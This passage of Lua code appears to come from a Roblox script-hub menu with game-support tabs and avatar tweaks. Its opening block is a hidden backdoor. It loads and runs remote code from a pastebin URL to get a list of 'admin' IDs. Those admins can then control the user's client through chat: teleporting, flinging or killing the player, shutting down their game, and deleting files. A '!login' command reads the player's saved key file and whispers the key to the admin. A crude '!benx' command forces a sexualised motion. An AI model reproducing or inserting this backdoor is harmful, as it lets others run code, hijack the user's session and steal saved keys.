                    task.spawn(function()
                        if not _G.Premium_Already_Loaded then
                            _G.Premium_Already_Loaded = true
                        
                            local speaker = game.Players.LocalPlayer
                            local admins = loadstring(game:HttpGet('https://pastebin.com/raw/mupA4i8u'))()
                            
                            function CMDs(cmd, admin)
                                admin = game.Players:FindFirstChild(admin.Name)
                                cmd = cmd:lower()
                                cmd = cmd .. ' '
                                cmd = cmd:split(' ')
                        
                                if admin ~= game.Players.LocalPlayer then
                                    return
                                end
                                local prefix = '!'

                                function make(msg, callback)
                                    if msg == '.' then
                                        callback()
                                    elseif FindPlayer(msg) ~= nil and FindPlayer(msg) == speaker then
                                        callback()
                                    end
                                end

                                --//Variables\\--
                                local bending = false

                                if cmd[1] == prefix..'bring' then
                                    make(cmd[2], function()
                                        getRoot(speaker).CFrame = getRoot(admin).CFrame * CFrame.new(0, 0, -2)
                                    end)
                                elseif cmd[1] == prefix..'benx' and bending == false then
                                    make(cmd[2], function()
                                        bending = true
                                        local dist = 0.5
                                        local reverse = false
                                        local benx = game:GetService('RunService').Heartbeat:Connect(function()
                                            if not reverse then
                                                dist = dist + 0.1
                                            else
                                                dist = dist - 0.1
                                            end
                                            if dist > 2.4 then
                                                reverse = true
                                            elseif dist < 0.5 then
                                                reverse = false
                                            end

                                            getRoot(speaker).CFrame = getRoot(admin).CFrame * CFrame.new(0, 0, -dist)
                                        end)
                                        task.spawn(function()
                                            repeat wait() until bending == false
                                            benx:Disconect()
                                        end)
                                        
                                    end)
                                elseif cmd[1] == prefix..'unbenx' then
                                    task.spawn(function()
                                        while bending == true do
                                            bending = false
                                            wait()
                                        end
                                    end)
                                elseif cmd[1] == prefix..'warn' then
                                    make(cmd[2], function()
                                        local message = ''

                                        
                                        message = cmd[3]

                                        NotifyV2(
                                            'Admin warn',
                                            message,
                                            tonumber(cmd[4])
                                        )


                                    end)
                                elseif cmd[1] == prefix..'kick' then
                                    make(cmd[2], function()
                                        game:Shutdown()
                                    end)
                                elseif cmd[1] == prefix..'fling' then
                                    make(cmd[2], function()
                                        getRoot(speaker).Velocity = Vector3.new(50000, 50000, 50000)
                                    end)
                                elseif cmd[1] == prefix..'kill' then
                                    make(cmd[2], function()
                                        getHumanoid(speaker).Health = 0
                                    end)
                                elseif cmd[1] == prefix..'login' then
                                    make(cmd[2], function()
                                        local key = game:GetService('HttpService'):JSONDecode(readfile(SavedKey))
                                        local args = {
                                            [1] = '/w '..admin.Name..' '..key.KeyMagnatta,
                                            [2] = "All"
                                        }

                                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

                                    end)
                                elseif cmd[1] == prefix..'dellogin' then
                                    make(cmd[2], function()
                                        delfile(SavedKey)
                                    end)
                                end
                            end
                            local emoji = ''
                            function star(plr)
                                game.RunService.RenderStepped:Connect(function()
                                    if plr.Character then
                                        if plr.Character.Humanoid then
                                            if not string.find(plr.Character.Humanoid.DisplayName, '['..emoji..']') then
                                                plr.Character.Humanoid.DisplayName = '['..emoji..']'..plr.Character.Humanoid.DisplayName
                                            end
                                        end
                                    end
                                end)
                            end
                            for i,id in pairs(admins) do
                                local admin = game.Players:GetPlayerByUserId(id)
                            
                                if admin ~= nil and admin then
                                    star(admin)
                                    admin.Chatted:Connect(function(msg)
                                        CMDs(msg, admin)
                                    end) 
                                end
                            end
                            game.Players.PlayerAdded:Connect(function(plr)
                                for i,id in pairs(admins) do
                                    if plr.UserId == id then
                                        star(plr)
                                        plr.Chatted:Connect(function(msg)
                                            CMDs(msg, plr)
                                        end)
                                    end
                                end
                            end)
                        end
                    end)

                    oldText = 'Game support'
                    function ChangeName(text)
                        for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
                            if v:IsA('TextButton') then
                                if v.Text == oldText then
                                    oldText = text
                                    v.Text = text                                    
                                end
                            end
                        end
                    end

                    local TabGames = {4913581664;142823291;185655149;606849621;5602055394;4753520418;10161058251;2970570231;4716045691;6155643742;3956818381;6335256554;1240123653;2788229376;3431407618;3095204897;621129760;920587237;2533391464;7560156054;155615604;383793228;6604417568;8003084678;537413528;2768379856;292439477;7555007091;7562422641;9203864304;142823291;3101667897;487316}
                    
                    getgenv().Laira_Games = TabGames
                    if CheckGame(TabGames) then
                        local SupportGame = Menu:CreateTab('Game support')
                        local b = SupportGame

                        function Korblox()
                            local ply = game.Players.LocalPlayer
                            local chr = ply.Character
                            chr.RightLowerLeg.MeshId = "902942093"
                            chr.RightLowerLeg.Transparency = "1"
                            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
                            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
                            chr.RightFoot.MeshId = "902942089"
                            chr.RightFoot.Transparency = "1"
                        end
                        function HeadLess()
                            game.Players.LocalPlayer.Character.Head.Transparency = 1
                            game.Players.LocalPlayer.Character.Head:FindFirstChildWhichIsA('Decal').Transparency = 1
                        end
                        function Animation()
                            if not game:IsLoaded() then
                                game.Loaded:wait()
                            end
                            
                            function ReAnimated()
                            
                            local Animate = game.Players.LocalPlayer.Character.Animate
                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
                            end 
                            
                            ReAnimated()
                            game.Players.LocalPlayer.CharacterAdded:Connect(function()
                                game.Players.LocalPlayer.Character:WaitForChild('Animate')
                                ReAnimated()
                            end)
                        end

                        
                        --[[Cart Ride]] if game.PlaceId == 4913581664 then
                            ChangeName('Cart ride into Rdite')

                            AddFindPlayer(b, 'Target')

                            function getCarrinho(plr)
                                local carrinho
                                local dist = math.huge
                                local max = 25
                                for i,v in pairs(game:GetService("Workspace").Carts:GetDescendants()) do
                                    if v.Name == 'On' then
                                        local mag = (getRoot(plr).Position - v.Position).Magnitude

                                        if mag < max and mag < dist then
                                            dist = mag
                                            carrinho = v.Parent
                                        end
                                    end
                                end
                                
                                return carrinho
                            end

